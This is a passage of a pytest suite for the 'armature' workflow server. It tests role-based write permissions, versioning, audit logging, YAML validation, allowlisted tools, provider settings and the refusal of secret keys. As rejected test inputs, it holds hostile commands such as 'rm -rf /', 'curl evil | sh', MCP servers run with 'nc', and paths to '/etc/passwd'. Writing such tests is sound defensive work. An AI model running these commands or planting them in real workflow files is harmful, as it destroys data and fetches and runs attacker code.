"""Editing workflows, documents, providers, and settings: permissions, validation, versions, and resolution."""
from __future__ import annotations

from dataclasses import dataclass, field
from pathlib import Path
from typing import ClassVar

import pytest
from sqlalchemy import insert, select

from armature.packs import AdapterDef
from armature.server import defs, runners
from armature.server.db import new_id
from armature.server.db.schema import (
    audit,
    documents,
    jobs,
    projects,
    providers,
    runs,
    settings,
    teams,
    workflows,
)
from tests.server.app_support import (
    Clock,
    add_membership,
    add_user,
    make_client,
    mutation,
    sign_in_as,
)

ROLES = ("admin", "team_lead", "project_lead", "contributor", "viewer")

GOOD = """# Review one pull request.
name: review
stages:
  - id: resolve   # reads the pull request
    adapter: demo/resolve
    with:
      number: 3
  - id: post
    adapter: demo/post
    depends_on: [resolve]
"""

RAW = GOOD + """adapters:
  build:
    name: build
    type: script
    cmd: ./scripts/build.sh
"""

ROLE_DOC = """---
name: security
tools: [Read, Grep]
---

You are the security reviewer.
"""


class FakeCatalog:
    adapters: ClassVar[dict[str, AdapterDef]] = {
        "demo/resolve": AdapterDef(cmd="resolve.sh", params={
            "type": "object", "properties": {"number": {"type": "integer"}}, "additionalProperties": False}),
        "demo/post": AdapterDef(cmd="post.sh"),
    }

    def get(self, ref):
        return self.adapters.get(ref)

    def tools_allowlist(self):
        return ["Read", "Grep", "Glob"]

    def mcp_allowlist(self):
        return ["github"]


@pytest.fixture(autouse=True)
def fake_catalog(monkeypatch):
    monkeypatch.setattr(defs, "load_catalog", lambda packs_dir=None: FakeCatalog())


@dataclass
class Side:
    team: str
    project: str
    sibling: str
    wf: dict[str, str] = field(default_factory=dict)
    doc: dict[str, str] = field(default_factory=dict)


@dataclass
class World:
    engine: object
    keyring: object
    clock: Clock
    own: Side
    other: Side
    users: dict[str, str]
    instance_wf: str
    instance_doc: str


def _add_def(conn, kind, scope, name, body, clock, doc_kind="role"):
    row_id = new_id()
    values = {"id": row_id, kind.name_col: name, "current_version": 1, "created_at": clock(),
              "updated_at": clock(), **scope.columns()}
    if kind is defs.DOCUMENT:
        values["kind"] = doc_kind
    conn.execute(insert(kind.table).values(**values))
    defs._add_version(conn, kind, row_id, 1, body, defs._note(kind, body, "seed"), "seed", clock())
    return row_id


def _side(conn, label, clock):
    team, project, sibling = new_id(), new_id(), new_id()
    conn.execute(insert(teams).values(id=team, name=f"team-{label}", created_at=clock()))
    for project_id, name in ((project, f"proj-{label}"), (sibling, f"sib-{label}")):
        conn.execute(insert(projects).values(id=project_id, team_id=team, name=name, created_at=clock()))
    side = Side(team=team, project=project, sibling=sibling)
    for kind, store, body in ((defs.WORKFLOW, side.wf, GOOD), (defs.DOCUMENT, side.doc, ROLE_DOC)):
        store["team"] = _add_def(conn, kind, defs.DefScope("team", team), "review" if kind is defs.WORKFLOW
                                 else "security", body, clock)
        store["project"] = _add_def(conn, kind, defs.DefScope("project", team, project),
                                    "review" if kind is defs.WORKFLOW else "security", body, clock)
    return side


@pytest.fixture
def world(engine, keyring):
    clock = Clock()
    with engine.begin() as conn:
        own, other = _side(conn, "own", clock), _side(conn, "other", clock)
        instance_wf = _add_def(conn, defs.WORKFLOW, defs.INSTANCE, "review", RAW, clock)
        instance_doc = _add_def(conn, defs.DOCUMENT, defs.INSTANCE, "security", ROLE_DOC, clock)
    ids = {role: add_user(engine, keyring, clock, role.replace("_", "-"), is_admin=role == "admin")[0]
           for role in ROLES}
    add_membership(engine, clock, ids["team_lead"], "team", own.team, "team_lead")
    for role in ("project_lead", "contributor", "viewer"):
        add_membership(engine, clock, ids[role], "project", own.project, role)
    return World(engine, keyring, clock, own, other, ids, instance_wf, instance_doc)


def _client(world, role, step_up=True):
    client = make_client(world.engine, world.keyring, world.clock)
    csrf = sign_in_as(client, world.engine, world.keyring, world.clock, world.users[role], step_up=step_up)
    client.headers.update(mutation(csrf))
    return client


def _current(world, kind, object_id):
    with world.engine.connect() as conn:
        return conn.execute(select(kind.table.c.current_version).where(kind.table.c.id == object_id)).scalar()


# Who may write where: True allowed, 403 refused, 404 hidden.
WRITE = {
    "admin": {"instance": True, "own_team": True, "own_project": True, "sibling": True, "other_team": True,
              "other_project": True},
    "team_lead": {"instance": 403, "own_team": True, "own_project": True, "sibling": True, "other_team": 404,
                  "other_project": 404},
    "project_lead": {"instance": 403, "own_team": 403, "own_project": True, "sibling": 404, "other_team": 404,
                     "other_project": 404},
    "contributor": {"instance": 403, "own_team": 403, "own_project": 403, "sibling": 404, "other_team": 404,
                    "other_project": 404},
    "viewer": {"instance": 403, "own_team": 403, "own_project": 403, "sibling": 404, "other_team": 404,
               "other_project": 404},
}


def _scope(world, where):
    return {"instance": ("instance", None), "own_team": ("team", world.own.team),
            "own_project": ("project", world.own.project), "sibling": ("project", world.own.sibling),
            "other_team": ("team", world.other.team), "other_project": ("project", world.other.project)}[where]


def _existing(world, kind, where):
    store = world.own.wf if kind is defs.WORKFLOW else world.own.doc
    other = world.other.wf if kind is defs.WORKFLOW else world.other.doc
    return {"instance": world.instance_wf if kind is defs.WORKFLOW else world.instance_doc,
            "own_team": store["team"], "own_project": store["project"], "other_team": other["team"],
            "other_project": other["project"]}.get(where)


def _expect(response, outcome, ok_status=200):
    if outcome is True:
        assert response.status_code == ok_status, response.text
    else:
        assert response.status_code == outcome, response.text


@pytest.mark.parametrize("role", ROLES)
@pytest.mark.parametrize("kind", [defs.WORKFLOW, defs.DOCUMENT], ids=["workflow", "document"])
def test_create_matrix(world, role, kind):
    client = _client(world, role)
    path = "/api/workflows" if kind is defs.WORKFLOW else "/api/documents"
    for where, outcome in WRITE[role].items():
        scope_kind, scope_id = _scope(world, where)
        payload = {"scope_kind": scope_kind, "scope_id": scope_id, "note": "new"}
        payload.update({"name": f"fresh-{where}", "body": GOOD} if kind is defs.WORKFLOW
                       else {"key": f"fresh-{where}", "kind": "role", "body": ROLE_DOC})
        if kind is defs.WORKFLOW and outcome is True and scope_kind != "project":
            outcome = 400
        _expect(client.post(path, json=payload), outcome, 201)


@pytest.mark.parametrize("role", ROLES)
@pytest.mark.parametrize("kind", [defs.WORKFLOW, defs.DOCUMENT], ids=["workflow", "document"])
def test_edit_rollback_delete_matrix(world, role, kind):
    client = _client(world, role)
    path = "/api/workflows" if kind is defs.WORKFLOW else "/api/documents"
    body = GOOD.replace("number: 3", "number: 4") if kind is defs.WORKFLOW else ROLE_DOC + "\nMore.\n"
    for where in ("instance", "own_team", "own_project", "other_team", "other_project"):
        object_id = _existing(world, kind, where)
        outcome = WRITE[role][where]
        edited = RAW.replace("number: 3", "number: 4") if where == "instance" and kind is defs.WORKFLOW else body
        saved = client.post(f"{path}/{object_id}", json={"body": edited, "base_version": 1, "note": "edit"})
        _expect(saved, outcome)
        _expect(client.post(f"{path}/{object_id}/rollback", json={"version": 1}), outcome)
        _expect(client.post(f"{path}/{object_id}/delete", json={}), outcome)


@pytest.mark.parametrize("role", ROLES)
def test_fork_matrix(world, role):
    client = _client(world, role)
    for source in ("instance", "own_team", "other_team"):
        for dest, outcome in WRITE[role].items():
            if dest in ("instance", "other_project", "sibling") and role != "admin":
                continue
            scope_kind, scope_id = _scope(world, dest)
            source_id = _existing(world, defs.DOCUMENT, source)
            readable = role == "admin" or source != "other_team"
            expected = outcome if readable else 404
            response = client.post(f"/api/documents/{source_id}/fork",
                                   json={"scope_kind": scope_kind, "scope_id": scope_id,
                                         "name": f"fork-{source}-{dest}"})
            _expect(response, expected, 201)


def test_reads_hide_other_teams_and_projects(world):
    client = _client(world, "project_lead")
    listed = {(w["scope_kind"], w["scope_id"]) for w in client.get("/api/workflows").json()["workflows"]}
    assert ("team", world.other.team) not in listed and ("project", world.other.project) not in listed
    assert ("project", world.own.project) in listed and ("instance", "*") in listed
    assert client.get(f"/api/workflows/{world.other.wf['team']}").status_code == 404
    assert client.get(f"/api/workflows/{world.other.wf['team']}/versions/1").status_code == 404
    assert client.get(f"/api/workflows/{world.other.wf['team']}/diff").status_code == 404
    assert client.get("/api/workflows", params={"team": world.other.team}).status_code == 404
    validate = client.post("/api/workflows/validate", json={"body": GOOD, "workflow_id": world.other.wf["team"]})
    assert validate.status_code == 404


def test_list_shows_scope_and_effective_for(world):
    client = _client(world, "team_lead")
    rows = client.get("/api/workflows", params={"team": world.own.team}).json()["workflows"]
    by_scope = {w["scope_kind"]: w for w in rows}
    assert set(by_scope) == {"instance", "team", "project"}
    assert by_scope["team"]["scope_name"] == "team-own" and by_scope["project"]["scope_name"] == "proj-own"
    assert by_scope["project"]["effective_for"] == [{"scope_kind": "project", "scope_id": world.own.project,
                                                     "scope_name": "proj-own"}]
    assert {(e["scope_kind"], e["scope_id"]) for e in by_scope["team"]["effective_for"]} == {
        ("team", world.own.team), ("project", world.own.sibling)}
    assert by_scope["instance"]["effective_for"] == []
    assert by_scope["team"]["editable"] and not by_scope["instance"]["editable"]
    assert all(w["can_fork"] for w in rows)
    assert by_scope["team"]["lint_ok"] is True
    viewer = _client(world, "viewer").get("/api/workflows").json()["workflows"]
    assert not any(w["editable"] or w["can_fork"] for w in viewer)
    detail = client.get(f"/api/workflows/{world.own.wf['team']}").json()["workflow"]
    assert {e["scope_name"] for e in detail["effective_for"]} == {"team-own", "sib-own"}
    doc = client.get(f"/api/documents/{world.own.doc['project']}").json()["document"]
    assert [e["scope_id"] for e in doc["effective_for"]] == [world.own.project]


def test_every_write_is_versioned_and_audited(world):
    client = _client(world, "team_lead")
    object_id = world.own.wf["team"]
    body = GOOD.replace("number: 3", "number: 5")
    saved = client.post(f"/api/workflows/{object_id}", json={"body": body, "base_version": 1, "note": "five"})
    assert saved.status_code == 200, saved.text
    assert saved.json()["version"]["version"] == 2 and saved.json()["version"]["author"] == "team-lead"
    assert saved.json()["version"]["note"].splitlines() == ["five", "lint: ok"]
    rolled = client.post(f"/api/workflows/{object_id}/rollback", json={"version": 1}).json()
    assert rolled["version"]["version"] == 3 and rolled["version"]["body"] == GOOD
    detail = client.get(f"/api/workflows/{object_id}").json()
    assert [v["version"] for v in detail["versions"]] == [3, 2, 1] and detail["editable"]
    assert client.get(f"/api/workflows/{object_id}/versions/2").json()["version"]["body"] == body
    diff = client.get(f"/api/workflows/{object_id}/diff", params={"from": 1, "to": 2}).json()["diff"]
    assert "-      number: 3" in diff and "+      number: 5" in diff
    with world.engine.connect() as conn:
        actions = [r.action for r in conn.execute(select(audit.c.action).where(audit.c.target_id == object_id)
                                                  .order_by(audit.c.at))]
    assert actions == ["workflow.version", "workflow.rollback"]


def test_stale_base_version_is_a_conflict(world):
    client = _client(world, "team_lead")
    object_id = world.own.wf["team"]
    first = client.post(f"/api/workflows/{object_id}", json={"body": GOOD, "base_version": 1})
    assert first.status_code == 200
    stale = client.post(f"/api/workflows/{object_id}", json={"body": GOOD, "base_version": 1})
    assert stale.status_code == 409
    assert stale.json() == {"error": "conflict", "current_version": 2}
    assert _current(world, defs.WORKFLOW, object_id) == 2
    rollback = client.post(f"/api/workflows/{object_id}/rollback", json={"version": 1, "base_version": 1})
    assert rollback.status_code == 409 and rollback.json()["current_version"] == 2
    assert client.post(f"/api/workflows/{object_id}/rollback",
                       json={"version": 1, "base_version": 2}).status_code == 200


@pytest.mark.parametrize("payload", [{"body": GOOD, "base_version": "1"}, {"body": GOOD, "base_version": 1.0},
                                     {"body": GOOD, "base_version": True}])
def test_versions_must_be_integers(world, payload):
    client = _client(world, "team_lead")
    object_id = world.own.wf["team"]
    assert client.post(f"/api/workflows/{object_id}", json=payload).status_code == 400
    assert client.post(f"/api/workflows/{object_id}/rollback", json={"version": "1"}).status_code == 400


def test_step_up_needed_except_for_body_edits(world):
    client = _client(world, "team_lead", step_up=False)
    object_id = world.own.wf["team"]
    assert client.post(f"/api/workflows/{object_id}", json={"body": GOOD, "base_version": 1}).status_code == 200
    refused = [
        client.post("/api/workflows", json={"name": "x", "scope_kind": "team", "scope_id": world.own.team,
                                            "body": GOOD}),
        client.post(f"/api/workflows/{object_id}/fork", json={"scope_kind": "project", "scope_id": world.own.project,
                                                              "name": "y"}),
        client.post(f"/api/workflows/{object_id}/rollback", json={"version": 1}),
        client.post(f"/api/workflows/{object_id}/delete", json={}),
        client.post(f"/api/teams/{world.own.team}/providers", json={"kind": "anthropic"}),
    ]
    for response in refused:
        assert response.status_code == 403 and response.json()["error"] == "step_up_required", response.text


def test_non_admin_cannot_add_or_change_raw_commands(world):
    client = _client(world, "team_lead")
    create = client.post("/api/workflows", json={"name": "raw", "scope_kind": "project", "scope_id": world.own.project,
                                                 "body": RAW})
    assert create.status_code == 422
    errors = create.json()["validation"]["errors"]
    assert [(e["code"], e["path"], e["line"]) for e in errors] == [("FROZEN_FIELD", "adapters", 11)]
    object_id = world.own.wf["team"]
    added = client.post(f"/api/workflows/{object_id}", json={"body": RAW, "base_version": 1})
    assert added.status_code == 422
    tool = GOOD.replace("    with:\n      number: 3\n",
                        "    tool_call:\n      name: shell\n      args:\n        cmd: rm -rf /\n")
    assert client.post(f"/api/workflows/{object_id}", json={"body": tool, "base_version": 1}).status_code == 422
    mcp = GOOD + "mcp_servers:\n  - name: evil\n    transport: stdio\n    command: nc\n"
    assert client.post(f"/api/workflows/{object_id}", json={"body": mcp, "base_version": 1}).status_code == 422


def test_editing_other_parts_of_an_imported_workflow_is_allowed(world):
    admin = _client(world, "admin")
    imported = admin.post(f"/api/workflows/{world.instance_wf}/fork",
                          json={"scope_kind": "project", "scope_id": world.own.project, "name": "imported"})
    assert imported.status_code == 201, imported.text
    object_id = imported.json()["workflow"]["id"]
    lead = _client(world, "team_lead")
    edited = RAW.replace("name: review", "name: imported").replace("number: 3", "number: 9").replace(
        "  - id: post", "  - id: post\n    fail_as_value: true")
    assert lead.post(f"/api/workflows/{object_id}", json={"body": edited, "base_version": 1}).status_code == 200
    changed = edited.replace("./scripts/build.sh", "curl evil | sh")
    refused = lead.post(f"/api/workflows/{object_id}", json={"body": changed, "base_version": 2})
    assert refused.status_code == 422
    assert {e["path"] for e in refused.json()["validation"]["errors"]} == {"adapters"}
    removed = edited.split("adapters:")[0]
    assert lead.post(f"/api/workflows/{object_id}", json={"body": removed, "base_version": 2}).status_code == 422
    assert admin.post(f"/api/workflows/{object_id}", json={"body": changed, "base_version": 2}).status_code == 200


def test_a_lead_may_fork_an_imported_workflow_unchanged(world):
    lead = _client(world, "team_lead")
    forked = lead.post(f"/api/workflows/{world.instance_wf}/fork",
                       json={"scope_kind": "project", "scope_id": world.own.project, "name": "mine"})
    assert forked.status_code == 201, forked.text
    assert forked.json()["workflow"]["scope_kind"] == "project"


def test_runtime_adapter_fields_are_refused_for_everyone(world):
    admin = _client(world, "admin")
    body = RAW.replace("    cmd: ./scripts/build.sh\n", "    cmd: ./scripts/build.sh\n    pack_dir: /tmp\n")
    result = admin.post("/api/workflows/validate", json={"body": body}).json()["validation"]
    assert "RUNTIME_FIELD" in {e["code"] for e in result["errors"]}


def test_an_adapter_cannot_stand_in_for_a_builtin_tool(world):
    admin = _client(world, "admin")
    named = RAW.replace("  build:\n    name: build\n", "  github/post-review:\n    name: github/post-review\n")
    command = RAW.replace("cmd: ./scripts/build.sh", "cmd: armature  tool slack.post")
    for body in (named, command):
        result = admin.post("/api/workflows/validate", json={"body": body}).json()["validation"]
        assert "RESERVED_ADAPTER" in {e["code"] for e in result["errors"]}
    plain = admin.post("/api/workflows/validate", json={"body": RAW}).json()["validation"]
    assert "RESERVED_ADAPTER" not in {e["code"] for e in plain["errors"]}


def test_validation_reports_lines(world):
    client = _client(world, "project_lead")

    def errors(body):
        return client.post("/api/workflows/validate", json={"body": body}).json()["validation"]["errors"]

    parse = errors("name: x\nstages: [\n")
    assert parse[0]["code"] == "YAML" and parse[0]["line"] == 3
    schema = errors(GOOD.replace("  - id: post\n", "  - id: post\n    fan_out: lots\n"))
    assert schema[0]["code"] == "SCHEMA" and schema[0]["line"] == 9 and schema[0]["path"] == "stages[1].fan_out"
    dangling = errors(GOOD.replace("depends_on: [resolve]", "depends_on: [nowhere]"))
    assert dangling[0]["line"] == 8
    lint = errors(GOOD.replace("  - id: post\n", "  - id: post\n    skip_if: '{{ x.__class__ }}'\n"))
    assert [(e["code"], e["line"]) for e in lint] == [("UNSAFE_TEMPLATE", 9)]


def test_lint_already_saved_is_a_warning(world):
    admin = _client(world, "admin")
    unsafe = GOOD.replace("  - id: post\n", "  - id: post\n    skip_if: '{{ x.__class__ }}'\n")
    object_id = world.own.wf["team"]
    assert admin.post(f"/api/workflows/{object_id}", json={"body": unsafe, "base_version": 1}).status_code == 422
    with world.engine.begin() as conn:
        row = defs.get_row(conn, defs.WORKFLOW, object_id)
        defs._advance(conn, defs.WORKFLOW, row, 1, unsafe, defs._note(defs.WORKFLOW, unsafe, None), "seed",
                      world.clock())
    lead = _client(world, "team_lead")
    edited = unsafe.replace("number: 3", "number: 8")
    saved = lead.post(f"/api/workflows/{object_id}", json={"body": edited, "base_version": 2})
    assert saved.status_code == 200, saved.text
    assert [w["code"] for w in saved.json()["validation"]["warnings"]] == ["UNSAFE_TEMPLATE"]
    assert saved.json()["workflow"]["lint_ok"] is False


def test_pack_references_are_checked(world):
    client = _client(world, "team_lead")

    def errors(body):
        return client.post("/api/workflows/validate", json={"body": body}).json()["validation"]["errors"]

    unknown = errors(GOOD.replace("demo/post", "demo/missing"))
    assert [(e["code"], e["line"]) for e in unknown] == [("UNKNOWN_ADAPTER", 9)]
    params = errors(GOOD.replace("number: 3", "number: three"))
    assert [(e["code"], e["line"], e["path"]) for e in params] == [("INVALID_PARAMS", 7, "stages[0].with.number")]
    assert "integer" in params[0]["message"]
    assert errors(GOOD) == []


def test_documents_validate_front_matter_and_tool_allowlist(world):
    lead = _client(world, "project_lead")
    object_id = world.own.doc["project"]

    def save(body):
        return lead.post(f"/api/documents/{object_id}", json={"body": body, "base_version": _current(
            world, defs.DOCUMENT, object_id)})

    assert save(ROLE_DOC.replace("name: security\n", "")).status_code == 422
    assert save("---\nname: [\n---\n").json()["validation"]["errors"][0]["line"] == 3
    assert save(ROLE_DOC.replace("[Read, Grep]", "[Read, Grep, Glob]")).status_code == 200
    wider = save(ROLE_DOC.replace("[Read, Grep]", '[Read, Grep, Glob, "Bash(*)"]'))
    assert wider.status_code == 422
    assert wider.json()["validation"]["errors"][0] == {
        "line": 3, "col": 1, "code": "NOT_ALLOWLISTED", "path": "tools",
        "message": "Only an admin can add tools outside the installed packs' allowlist: Bash(*)."}
    mcp = save(ROLE_DOC.replace("tools: [Read, Grep]", "tools: [Read, Grep, Glob]\nmcp_servers: [jira]"))
    assert mcp.status_code == 422
    assert save(ROLE_DOC.replace("tools: [Read, Grep]", "tools: [Read]\nmcp_servers: [github]")).status_code == 200
    admin = _client(world, "admin")
    assert admin.post("/api/documents/validate", json={"kind": "role", "body": ROLE_DOC.replace(
        "[Read, Grep]", '["Bash(*)"]')}).json()["validation"]["ok"]
    big = admin.post("/api/documents/validate", json={"kind": "prompt", "body": "x" * (defs.BODY_MAX + 1)})
    assert big.json()["validation"]["errors"][0]["code"] == "TOO_LARGE"


def test_a_document_body_up_to_the_cap_saves(world):
    admin = _client(world, "admin")
    body = "x" * (defs.BODY_MAX - 10)
    created = admin.post("/api/documents", json={"kind": "prompt", "key": "long", "scope_kind": "instance",
                                                 "body": body})
    assert created.status_code == 201, created.text[:200]


def test_delete_keeps_runs_and_refuses_active_jobs(world):
    admin = _client(world, "admin")
    object_id = world.own.wf["team"]
    run_id = new_id()
    with world.engine.begin() as conn:
        conn.execute(insert(runs).values(id=run_id, team_id=world.own.team, workflow_id=object_id,
                                         workflow_name="review", status="succeeded", started_at=world.clock()))
        conn.execute(insert(jobs).values(id=new_id(), team_id=world.own.team, workflow_id=object_id,
                                         status="queued", created_at=world.clock()))
    assert admin.post(f"/api/workflows/{object_id}/delete", json={}).status_code == 409
    with world.engine.begin() as conn:
        conn.execute(jobs.update().values(status="succeeded"))
    assert admin.post(f"/api/workflows/{object_id}/delete", json={}).status_code == 200
    with world.engine.connect() as conn:
        assert conn.execute(select(workflows.c.id).where(workflows.c.id == object_id)).first() is None
        assert conn.execute(select(runs.c.workflow_id).where(runs.c.id == run_id)).scalar() is None


def test_fork_names_must_be_free_in_the_destination(world):
    admin = _client(world, "admin")
    clash = admin.post(f"/api/workflows/{world.instance_wf}/fork",
                       json={"scope_kind": "project", "scope_id": world.own.project})
    assert clash.status_code == 409
    team = admin.post(f"/api/workflows/{world.instance_wf}/fork",
                      json={"scope_kind": "team", "scope_id": world.own.team, "name": "elsewhere"})
    assert team.status_code == 400 and "project" in team.json()["error"]


def test_resolution_prefers_project_then_team_then_instance(world):
    with world.engine.connect() as conn:
        assert defs.resolve_workflow(conn, "review", world.own.team, world.own.project).id == world.own.wf["project"]
        assert defs.resolve_workflow(conn, "review", world.own.team, world.own.sibling).id == world.own.wf["team"]
        assert defs.resolve_workflow(conn, "review", new_id(), None).id == world.instance_wf
        assert defs.resolve_document(conn, "role", "security", world.own.team,
                                     world.own.project).id == world.own.doc["project"]
        assert defs.resolve_workflow(conn, "missing", world.own.team, None) is None
    with world.engine.begin() as conn:
        key, _ = runners.create_key(conn, world.keyring, team_id=world.own.team, name="ci", actor_id=None,
                                    now=world.clock(), ip=None)
    with world.engine.begin() as conn:
        key_row = conn.execute(select(runners.runner_keys)).first()
        project_run, _ = runners.register_run(conn, world.keyring, key=key_row,
                                              body={"workflow": "review", "project": "proj-own"},
                                              now=world.clock(), ip=None)
        team_run, _ = runners.register_run(conn, world.keyring, key=key_row,
                                           body={"workflow": "review", "project": "sib-own"}, now=world.clock(),
                                           ip=None)
    assert key["name"] == "ci"
    assert project_run["workflow_id"] == world.own.wf["project"]
    assert team_run["workflow_id"] == world.own.wf["team"]


def test_scope_check_constraint_rejects_a_mismatched_scope(engine):
    from sqlalchemy.exc import IntegrityError, OperationalError
    clock = Clock()
    with engine.begin() as conn:
        team, project = new_id(), new_id()
        conn.execute(insert(teams).values(id=team, name="t", created_at=clock()))
        conn.execute(insert(projects).values(id=project, team_id=team, name="p", created_at=clock()))
    with pytest.raises((IntegrityError, OperationalError)), engine.begin() as conn:
        conn.execute(insert(documents).values(id=new_id(), team_id=None, project_id=project, scope=project,
                                              kind="role", key="k", current_version=1, created_at=clock(),
                                              updated_at=clock()))
    with engine.begin() as conn:
        conn.execute(insert(workflows).values(id=new_id(), team_id=team, project_id=project, name="w",
                                              current_version=1, created_at=clock(), updated_at=clock()))
        assert conn.execute(select(workflows.c.scope).where(workflows.c.name == "w")).scalar() == project


def test_parse_and_render_round_trip(world):
    client = _client(world, "viewer")
    parsed = client.post("/api/workflows/parse", json={"body": RAW}).json()
    assert parsed["adapters"] == ["build"] and parsed["errors"] == []
    assert [(s["id"], s["line"]) for s in parsed["stages"]] == [("resolve", 4), ("post", 8)]
    assert parsed["stages"][0]["with"] == {"number": 3}
    same = client.post("/api/workflows/render", json={"body": RAW, "stages": parsed["stages"]}).json()["body"]
    assert same == RAW
    stages = parsed["stages"]
    stages[1].update(fail_as_value=True, depends_on=[])
    stages.append({"id": "notify", "adapter": "demo/post", "depends_on": ["post"], "custom": "ignored"})
    rendered = client.post("/api/workflows/render", json={"body": RAW, "stages": stages}).json()["body"]
    assert "# Review one pull request." in rendered and "# reads the pull request" in rendered
    assert "  - id: post\n    adapter: demo/post\n    fail_as_value: true\n" in rendered
    assert "  - id: notify\n    adapter: demo/post\n    depends_on: [post]\n" in rendered
    assert "cmd: ./scripts/build.sh" in rendered and "custom" not in rendered
    assert client.post("/api/workflows/render", json={"body": RAW, "stages": [{"adapter": "x"}]}).status_code == 400
    assert client.post("/api/workflows/parse", json={"body": "stages: ["}).json()["errors"][0]["code"] == "YAML"


PROVIDERS = [
    ({"kind": "bedrock", "config": {"region": "us-east-1"}, "credential_secret": "AWS_BEARER_TOKEN_BEDROCK",
      "aliases": {"lead": "us.anthropic.claude-opus-5-5"}}, 200),
    ({"kind": "bedrock", "config": {}}, 400),
    ({"kind": "bedrock", "config": {"region": "mars"}}, 400),
    ({"kind": "anthropic", "credential_secret": "ANTHROPIC_API_KEY"}, 200),
    ({"kind": "claude-subscription"}, 400),
    ({"kind": "claude-subscription", "credential_secret": "CLAUDE_CODE_OAUTH_TOKEN"}, 200),
    ({"kind": "openai-compatible"}, 400),
    ({"kind": "openai-compatible", "config": {"api_base": "https://llm.example/v1"}}, 200),
    ({"kind": "openai-compatible", "config": {"api_base": "https://llm.example/v1", "api_key": "sk-1"}}, 400),
    ({"kind": "anthropic", "aliases": {"Lead": "claude"}}, 400),
    ({"kind": "anthropic", "aliases": {"lead": ""}}, 400),
    ({"kind": "anthropic", "credential_secret": "not a name"}, 400),
    ({"kind": "mystery"}, 400),
]


@pytest.mark.parametrize("payload,status", PROVIDERS, ids=range(len(PROVIDERS)))
def test_provider_config_is_validated(world, payload, status):
    response = _client(world, "team_lead").post(f"/api/teams/{world.own.team}/providers", json=payload)
    assert response.status_code == status, response.text


@pytest.mark.parametrize("role,own,other", [("admin", 200, 200), ("team_lead", 200, 404),
                                            ("project_lead", 403, 404), ("contributor", 403, 404),
                                            ("viewer", 403, 404)])
def test_provider_matrix(world, role, own, other):
    with world.engine.begin() as conn:
        ids = {}
        for label, team in (("own", world.own.team), ("other", world.other.team)):
            ids[label] = new_id()
            conn.execute(insert(providers).values(id=ids[label], team_id=team, kind="anthropic", config={},
                                                  aliases={}, created_at=world.clock(), updated_at=world.clock()))
    client = _client(world, role)
    for label, expected in (("own", own), ("other", other)):
        team = world.own.team if label == "own" else world.other.team
        created = client.post(f"/api/teams/{team}/providers", json={"kind": "ollama"})
        assert created.status_code == expected, created.text
        updated = client.post(f"/api/providers/{ids[label]}", json={"aliases": {"fast": "claude-haiku"}})
        assert updated.status_code == expected
        assert client.post(f"/api/providers/{ids[label]}/delete", json={}).status_code == expected
    if own == 200:
        with world.engine.connect() as conn:
            kinds = [r.action for r in conn.execute(select(audit.c.action).where(audit.c.target_kind == "provider"))]
        assert {"provider.create", "provider.update", "provider.delete"} <= set(kinds)


def test_provider_kind_cannot_change_and_one_per_kind(world):
    client = _client(world, "team_lead")
    first = client.post(f"/api/teams/{world.own.team}/providers", json={"kind": "anthropic"}).json()["provider"]
    assert client.post(f"/api/teams/{world.own.team}/providers", json={"kind": "anthropic"}).status_code == 409
    assert client.post(f"/api/providers/{first['id']}", json={"kind": "bedrock"}).status_code == 400


@pytest.mark.parametrize("role", ROLES)
def test_settings_are_admin_only_with_step_up(world, role):
    client = _client(world, role)
    response = client.post("/api/settings", json={"scope": "instance", "key": "ops.review.rounds", "value": 3})
    assert response.status_code == (200 if role == "admin" else 403)
    if role == "admin":
        assert _client(world, "admin", step_up=False).post(
            "/api/settings", json={"scope": "instance", "key": "x.y", "value": 1}).status_code == 403
        team = client.post("/api/settings", json={"scope": world.own.team, "key": "ops.review.rounds", "value": 2})
        assert team.json()["setting"] == {"key": "ops.review.rounds", "value": 2, "scope": world.own.team}
        assert client.post("/api/settings/delete", json={"scope": world.own.team,
                                                         "key": "ops.review.rounds"}).status_code == 200
        assert client.post("/api/settings/delete", json={"scope": world.own.team,
                                                         "key": "ops.review.rounds"}).status_code == 404
        with world.engine.connect() as conn:
            assert conn.execute(select(settings.c.value).where(settings.c.scope == "*")).scalar() == 3


@pytest.mark.parametrize("key", ["env.GITHUB_TOKEN", "env.aws_secret", "ops.api_key", "db.password", "app.KEY_PEM"])
def test_settings_refuse_secret_keys(world, key):
    response = _client(world, "admin").post("/api/settings", json={"scope": "instance", "key": key, "value": "v"})
    assert response.status_code == 400 and "Secrets" in response.json()["error"]


FULL = """name: review
description: Review a pull request.
model_tiers:
  large:
    provider: litellm
    model: claude
    api_base: https://llm.example
    api_key_env: KEY_A
  small:
    provider: litellm
    model: haiku
safety_mode: permissive
stages:
  - id: resolve
    adapter: demo/resolve
    with:
      number: 3
  - id: think
    role:
      name: thinker
      type: worker
      description: Think about it.
      tools: [Read]
      model_tier: large
    depends_on: [resolve]
"""

FROZEN = {
    "model_tiers.api_base": ("https://llm.example", "https://evil.example", "model_tiers"),
    "model_tiers.api_key_env": ("KEY_A", "KEY_B", "model_tiers"),
    "inject_file_as": ("    with:\n", "    inject_file_as: doc\n    with:\n", "stages[0].inject_file_as"),
    "sandbox_image": ("    with:\n", "    sandbox_image: evil:latest\n    with:\n", "stages[0].sandbox_image"),
    "subagent_spec": ("    with:\n", "    subagent_spec: other.yaml\n    with:\n", "stages[0].subagent_spec"),
    "subagent_spec_path": ("    with:\n", "    subagent_spec_path: /etc/x.yaml\n    with:\n",
                           "stages[0].subagent_spec_path"),
    "role.tools": ("tools: [Read]", "tools: [Read, Bash]", "stages[1].role.tools"),
    "role.name": ("name: thinker", "name: other", "stages[1].role.name"),
    "safety_mode": ("safety_mode: permissive", "safety_mode: strict", "safety_mode"),
    "skill_library": ("safety_mode", ("skill_library:\n  s:\n    id: s\n    description: d\n"
                                      "    path: /etc/passwd\nsafety_mode"), "skill_library"),
    "safety_rules": ("safety_mode", "safety_rules:\n  - tool: Bash\n    action: allow\nsafety_mode", "safety_rules"),
    "memory": ("safety_mode", "memory:\n  enabled: true\nsafety_mode", "memory"),
    "trace": ("safety_mode", "trace:\n  enabled: false\nsafety_mode", "trace"),
    "file_state": ("safety_mode", "file_state:\n  enabled: true\nsafety_mode", "file_state"),
    "roles": ("safety_mode", "roles:\n  r:\n    name: r\n    type: worker\n    description: d\nsafety_mode", "roles"),
    "tools": ("safety_mode", "tools:\n  - module: os\nsafety_mode", "tools"),
    "mcp_servers": ("safety_mode", "mcp_servers:\n  - name: m\n    transport: stdio\n    command: nc\nsafety_mode",
                    "mcp_servers"),
    "adapters": ("safety_mode", "adapters:\n  a:\n    name: a\n    type: script\n    cmd: ls\nsafety_mode", "adapters"),
